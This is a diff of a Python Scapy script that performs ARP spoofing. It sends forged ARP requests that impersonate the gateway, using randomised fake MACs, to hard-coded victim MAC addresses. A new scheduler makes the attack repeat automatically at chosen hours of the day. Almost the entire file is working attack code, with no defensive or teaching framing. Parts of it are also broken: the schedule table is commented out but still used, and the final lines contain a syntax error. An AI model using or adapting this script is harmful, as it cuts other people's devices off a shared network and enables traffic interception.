@@ -29,7 +29,6 @@ def GetBrocastIP(OurIP):return GetSubNet(OurIP) + "255"
 
 def GetForgedIP(OurIP,Num):
     SubString = GetSubNet(OurIP)
-
     ForgedIP,i = [],0
     while i < Num:
         num = int(random.uniform(0,255));TempIP = SubString + "%d"%num
@@ -73,55 +72,73 @@ def ScanfByArp(Retry=4,Delay=4):
 
 def GetIpByMac(Mac):
     return Table.get(Mac)
-    
-def Attack_MAC(Face,GWIP,MAC,PackNum,Counter,Interval):
-    
+
+MY_ip,MY_mac,BctIP,Bct_mac,GW_ip,GW_mac=None,None,None,None,None,None
+
+def GetOurInf(Face,Debug=True):
+    global MY_ip
+    global MY_mac
     MY_ip = get_if_addr(Face)
     MY_mac = get_if_hwaddr(Face)
-    if MY_ip is None or MY_mac is None:return
-    print("%s -> %s"%(MY_ip,MY_mac))
+    if MY_ip is None or MY_mac is None:return False
+    if Debug is True:print("%s -> %s"%(MY_ip,MY_mac))
+    return True
+    
+def GetLanInf(GWIP="192.168.0.1",Debug=True):
+    global BctIP
+    global Bct_mac
+    global GW_ip
+    global GW_mac
     
     BctIP = GetBrocastIP(MY_ip)
     Bct_mac = "ff:ff:ff:ff:ff:ff"
-    print("%s -> %s"%(BctIP,Bct_mac))
-    
+    if Debug is True:print("%s -> %s"%(BctIP,Bct_mac))
     GW_ip = GWIP
     GW_mac = GetMac(GW_ip)
     if GW_mac is None:return
-    print("%s -> %s"%(GW_ip,GW_mac))
-    
+    if Debug is True:print("%s -> %s"%(GW_ip,GW_mac))
+
+def GetAllHostInf():ScanfByArp(3,1)
+
+def GeneratePacket_1(PackNum,TargtMAC):
     PKT = []
-    
-    #scanf the subnet
-    ScanfByArp(3,1)
-    for XM_mac in MAC:
-        XM_ip = GetIpByMac(XM_mac)
-        print("%s -> %s"%(XM_ip,XM_mac))
-    cnt = 0
-    while True:
-        PKT = []
-        for XM_mac in MAC:
-            XM_ip = GetIpByMac(XM_mac)
-            #if the IP is not existed,pass it
-            if XM_ip is None:continue
+    for targtmac in TargtMAC:
+        targtIP = GetIpByMac(targtmac)
+        if targtIP is not None:
             Temp_mac = GetForgedMac(MY_mac,PackNum)
-            PKT_ = Ether(dst=XM_mac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=XM_ip,hwdst=XM_mac)
+            PKT_ = Ether(dst=targtmac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=targtIP,hwdst=targtmac)
             PKT.append(PKT_)
-        else : 
-            if len(PKT) is 0:print ("Target not found...");return
+    return PKT
+def SendPacket(PKT=[],Counter=1,Interval=1,Debug=True):
+    if len(PKT) is 0:
+        if Debug is True:print("Send zero packet....");return
+    for num in range(1,Counter+1):
         try:
-            cnt += 1
             sendp(PKT,iface = Face);
-            print("Will sleep for %s S and had sent %s PKTs"%(Interval,cnt))
+            if Debug is True:print("Wair for %s S had sent %s packets"%(Interval,num))
             time.sleep(Interval)
         except:print("!!Send Error!!")
-        if Counter == -1:pass
-        else:
-            if cnt >= Counter:return
-            
-#GWIP:your gateway's ip
-#Interface:the network interface you want to use
-#Delay:The delay between this action
+        
+def ShouldWeAttack(ScheduleTable,Debug=True):
+    CurHour=time.localtime(time.time()).tm_hour
+    CurMinu=time.localtime(time.time()).tm_min
+    CurCounter=CurHour*60+CurMinu
+    for i in range(0,len(ScheduleTable)//4):
+        Temp_Start=ScheduleTable[i*2+0]*60+ScheduleTable[i*2+1]
+        Temp_End=ScheduleTable[i*2+2]*60+ScheduleTable[i*2+3]
+        if (CurCounter>Temp_Start)and(CurCounter<Temp_End):return True
+    if Debug is True:
+        print(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time())))
+    return False
+
+def Attack_MAC(Face,GWIP,MAC,PackNum,Counter,Interval):
+    GetOurInf(Face,Debug = True)
+    GetLanInf(GWIP="192.168.0.1",Debug=True)
+    GetAllHostInf()
+    PKT=GeneratePacket_1(PackNum,MAC)
+    SendPacket(PKT,Counter,Interval)
+    return 
+    
 def EnsureWifiConnection(GWIP="192.168.0.1",Interface="eth0",Delay=2):
     if IsWifiWorkWell(GWIP) is False:
         print("Will restart the interface <%s>"%Interface)
@@ -135,26 +152,19 @@ def EnsureWifiConnection(GWIP="192.168.0.1",Interface="eth0",Delay=2):
         return True
     else:return False
     
-#To check whether the wifi is working well by acquiring GWIP's MAC(Usually our gateway's IP)
 def IsWifiWorkWell(GWIP = "192.168.0.1"):
     res = GetMac(GWIP)
     if res is None or res is "ff:ff:ff:ff:ff:ff":return False
     else:return True
-    
-def DelayForxMinute(Length=1,Print=True):
-    print("Delay started,Length is %s"%Length)
-    num=0
-    while num < Length:
-        time.sleep(60);num += 1
-        if Print is True:print("Delaying now...%s"%num)
-    else:print("Delay ended...")
 
 if __name__ == "__main__":
-    DelayForxMinute(0,True)
-    Counter = 0
-    #the mac you want to attack
+    #0:00~2:30
+    #6:00~8:30
+    #17:30~23:59
+    #ScheduleTable=[0,0,2,30,6,0,8,30,17,30,23,59]
+    #ScheduleTable=[0,0,23,59]
     TargetMac = ["04:e6:76:46:a6:f3","78:02:f8:34:4d:b5"]
     while True:
+        if ShouldWeAttack(ScheduleTable,True) is False:time.sleep(10);continue
         EnsureWifiConnection("192.168.0.1","ens33",2)
         Attack_MAC("ens33","192.168.0.1",TargetMac,10,10,1)
-        Counter += 1;if Counter >= 1000:break
